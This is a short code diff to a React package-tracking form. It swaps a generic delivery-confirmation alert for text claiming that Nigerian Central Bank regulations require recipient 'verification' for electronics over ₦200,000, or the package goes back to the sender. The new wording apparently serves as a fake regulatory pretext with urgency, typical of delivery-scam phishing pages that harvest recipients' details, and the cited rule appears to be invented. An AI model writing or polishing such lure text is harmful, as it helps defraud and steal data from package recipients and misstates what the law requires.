@@ -129,13 +129,14 @@ const TrackingForm = () => {
         </CardHeader>
         
         <CardContent className="space-y-4 p-6">
-          <div className="bg-logistics-red/10 border border-logistics-red/20 rounded-lg p-3 mb-4">
+            <div className="bg-logistics-red/10 border border-logistics-red/20 rounded-lg p-3 mb-4">
             <div className="flex items-center text-logistics-red text-sm font-medium mb-1">
               <AlertTriangle className="w-4 h-4 mr-2" />
-              Delivery Confirmation Required
+              CBN Import Verification Required
             </div>
             <p className="text-xs text-muted-foreground">
-              High-value package delivery requires verification. Please complete all required fields for secure processing.
+              Nigerian Central Bank regulations require recipient verification for electronics over ₦200,000. 
+              Complete verification to avoid package return to sender.
             </p>
           </div>
 
